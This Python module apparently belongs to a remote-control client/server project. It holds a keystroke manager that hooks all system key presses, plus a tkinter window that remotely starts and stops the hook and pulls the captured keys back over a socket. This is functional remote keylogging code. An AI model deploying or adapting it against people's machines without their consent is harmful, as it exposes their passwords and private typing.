import tkinter as tk
import tkinter.font as tkFont
from utils import receive_data
import keyboard


class KeystrokeManager:
    def __init__(self):
        self.hooking = False
        self.keys = []

    def on_keydown(self, event):
        if event.event_type == "down":
            key = event.name
            self.keys.append(key)

    def hook_key(self):
        if not self.hooking:
            self.hooking = True
            keyboard.hook(self.on_keydown)

    def unhook_key(self):
        if self.hooking:
            self.hooking = False
            keyboard.unhook_all()

    def hooked_keys(self):
        data = (''.join(self.keys)).encode('utf-8')
        self.keys.clear()
        return data


class KeystrokeUI:
    def __init__(self, client):
        self.hooking = False
        # setting title
        self.root = tk.Tk()
        self.root.title("Keystroke")
        # setting window size
        width = 600
        height = 500
        screenwidth = self.root.winfo_screenwidth()
        screenheight = self.root.winfo_screenheight()
        align_str = '%dx%d+%d+%d' % (width, height, (screenwidth - width) / 2, (screenheight - height) / 2)
        self.root.geometry(align_str)
        self.root.resizable(width=False, height=False)

        hook_btn = tk.Button(self.root)
        hook_btn["bg"] = "#efefef"
        ft = tkFont.Font(family='Times', size=10)
        hook_btn["font"] = ft
        hook_btn["fg"] = "#000000"
        hook_btn["justify"] = "center"
        hook_btn["text"] = "Hook"
        hook_btn.place(x=60, y=50, width=80, height=60)
        hook_btn["command"] = lambda: KeystrokeUI.hook_btn_command(client)

        unhook_btn = tk.Button(self.root)
        unhook_btn["bg"] = "#efefef"
        ft = tkFont.Font(family='Times', size=10)
        unhook_btn["font"] = ft
        unhook_btn["fg"] = "#000000"
        unhook_btn["justify"] = "center"
        unhook_btn["text"] = "Unhook"
        unhook_btn.place(x=150, y=50, width=80, height=60)
        unhook_btn["command"] = lambda: KeystrokeUI.unhook_btn_command(client)

        print_btn = tk.Button(self.root)
        print_btn["bg"] = "#efefef"
        ft = tkFont.Font(family='Times', size=10)
        print_btn["font"] = ft
        print_btn["fg"] = "#000000"
        print_btn["justify"] = "center"
        print_btn["text"] = "In phím"
        print_btn.place(x=240, y=50, width=80, height=60)
        print_btn["command"] = lambda: self.print_btn_command(client)

        delete_btn = tk.Button(self.root)
        delete_btn["bg"] = "#efefef"
        ft = tkFont.Font(family='Times', size=10)
        delete_btn["font"] = ft
        delete_btn["fg"] = "#000000"
        delete_btn["justify"] = "center"
        delete_btn["text"] = "Xóa"
        delete_btn.place(x=330, y=50, width=80, height=60)
        delete_btn["command"] = self.delete_btn_command

        self.result = tk.Text(self.root, state='disabled')
        self.result["borderwidth"] = "1px"
        ft = tkFont.Font(family='Times', size=10)
        self.result["font"] = ft
        self.result["fg"] = "#333333"
        self.result.place(x=60, y=120, width=350, height=188)

    def run(self):
        self.root.mainloop()

    @staticmethod
    def hook_btn_command(client):
        client.send_command('hook')

    @staticmethod
    def unhook_btn_command(client):
        client.send_command('unhook')

    def print_btn_command(self, client):
        client.send_command('get_hooked')
        data = receive_data(client, 1024)
        data = data.decode('utf-8')
        self.result.configure(state='normal')
        self.result.insert(tk.END, data)
        self.result.configure(state='disabled')

    def delete_btn_command(self):
        self.result.configure(state='normal')
        self.result.delete('1.0', tk.END)
        self.result.configure(state='disabled')
